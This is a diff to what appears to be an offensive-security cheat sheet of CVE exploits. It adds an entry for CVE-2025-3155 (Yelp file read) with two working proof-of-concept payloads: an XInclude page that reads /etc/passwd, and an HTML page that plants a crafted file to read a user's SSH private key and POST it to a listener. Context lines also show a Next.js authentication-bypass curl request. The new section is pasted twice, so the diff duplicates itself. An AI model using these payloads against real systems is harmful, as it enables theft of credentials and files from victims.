@@ -41,6 +41,7 @@
 - [CVE-2024-24919: Check Point Security Gateway Information Disclosure (0-day)](#cve-2024-24919-check-point-security-gateway-information-disclosure-0-day)
 - [CVE-2024-32002: Git: git clone RCE](#cve-2024-32002-git-git-clone-rce)
 - [CVE-2024-47176: EvilCUPS RCE](#cve-2024-47176-evilcups-rce)
+- [CVE-2025-3155: Yelp File Read](#cve-2025-3155-yelp-file-read)
 - [CVE-2025-29927: Next.js Authentication Bypass](#cve-2025-29927-nextjs-authentication-bypass)
 - [GodPotato LPE](#godpotato-lpe)
 - [Juicy Potato LPE](#juicy-potato-lpe)
@@ -188,6 +189,7 @@
 | CVE-2025-24813 | Apache Tomcat Deserialization RCE (1) | https://github.com/iSee857/CVE-2025-24813-PoC |
 | CVE-2025-24813 | Apache Tomcat Deserialization RCE (2) | https://github.com/absholi7ly/POC-CVE-2025-24813 |
 | CVE-2025-29927 | Next.js Authentication Bypass | https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware |
+| CVE-2025-3155 | Yelp File Read | https://gist.github.com/parrot409/e970b155358d45b298d7024edd9b17f2 |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
 | n/a | GSM Linux Kernel LPE (1) | https://github.com/jmpe4x/GSM_Linux_Kernel_LPE_Nday_Exploit |
@@ -2067,6 +2069,70 @@ if __name__ == "__main__":
 
 ```
 
+## CVE-2025-3155: Yelp File Read
+
+> https://gist.github.com/parrot409/e970b155358d45b298d7024edd9b17f2
+
+### XInclude
+
+```html
+<?xml version="1.0" encoding="utf-8"?>
+<page xmlns="http://projectmallard.org/1.0/" id="index">
+  <info>
+    <title type="text">poc</title>
+  </info>
+  <section>
+    <title>
+      <include parse="text" xmlns="http://www.w3.org/2001/XInclude" href="/etc/passwd" />
+    </title>
+  </section>
+</page>
+```
+
+### JavaScript Execution
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <title>poc</title>
+  <script>
+    let payloadPage = `
+<?xml version="1.0" encoding="utf-8"?>
+<page xmlns="http://projectmallard.org/1.0/" id="index">
+  <info>
+    <title type="text">poc</title>
+  </info>
+  <section>
+    <title>
+      <include parse="text" xmlns="http://www.w3.org/2001/XInclude" href="/proc/self/cwd/.ssh/id_rsa"/>
+    </title>
+    <svg:svg xmlns:svg="http://www.w3.org/2000/svg">
+      <svg:script>onload=_=>fetch("http://localhost:4000/",{method:"POST",body:document.body.outerHTML,mode:"no-cors"})</svg:script>
+    </svg:svg>
+  </section>
+</page>
+    `.trim()
+    function exp(){
+      const blob = new Blob([payloadPage], { type: 'text/plain' });
+      const blobURL = URL.createObjectURL(blob);
+
+      const a = document.createElement('a');
+      a.href = blobURL;
+      a.download = 'index.page';
+      document.body.appendChild(a);
+      a.click();
+
+      location = `ghelp:///proc/self/cwd/Downloads`
+    }
+  </script>
+</head>
+<body>
+  <button onclick="exp()">Click Here</button>
+</body>
+</html>
+```
+
 ## CVE-2025-29927: Next.js Authentication Bypass
 
 > https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
@@ -2077,6 +2143,70 @@ X-Middleware-Subrequest: middleware
 
 ```shell
 $ curl -H "X-Middleware-Subrequest: middleware" https://<RHOST>/admin
+```
+
+## CVE-2025-3155: Yelp File Read
+
+> https://gist.github.com/parrot409/e970b155358d45b298d7024edd9b17f2
+
+### XInclude
+
+```html
+<?xml version="1.0" encoding="utf-8"?>
+<page xmlns="http://projectmallard.org/1.0/" id="index">
+  <info>
+    <title type="text">poc</title>
+  </info>
+  <section>
+    <title>
+      <include parse="text" xmlns="http://www.w3.org/2001/XInclude" href="/etc/passwd" />
+    </title>
+  </section>
+</page>
+```
+
+### JavaScript Execution
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <title>poc</title>
+  <script>
+    let payloadPage = `
+<?xml version="1.0" encoding="utf-8"?>
+<page xmlns="http://projectmallard.org/1.0/" id="index">
+  <info>
+    <title type="text">poc</title>
+  </info>
+  <section>
+    <title>
+      <include parse="text" xmlns="http://www.w3.org/2001/XInclude" href="/proc/self/cwd/.ssh/id_rsa"/>
+    </title>
+    <svg:svg xmlns:svg="http://www.w3.org/2000/svg">
+      <svg:script>onload=_=>fetch("http://localhost:4000/",{method:"POST",body:document.body.outerHTML,mode:"no-cors"})</svg:script>
+    </svg:svg>
+  </section>
+</page>
+    `.trim()
+    function exp(){
+      const blob = new Blob([payloadPage], { type: 'text/plain' });
+      const blobURL = URL.createObjectURL(blob);
+
+      const a = document.createElement('a');
+      a.href = blobURL;
+      a.download = 'index.page';
+      document.body.appendChild(a);
+      a.click();
+
+      location = `ghelp:///proc/self/cwd/Downloads`
+    }
+  </script>
+</head>
+<body>
+  <button onclick="exp()">Click Here</button>
+</body>
+</html>
 ```
 
 ## GodPotato LPE
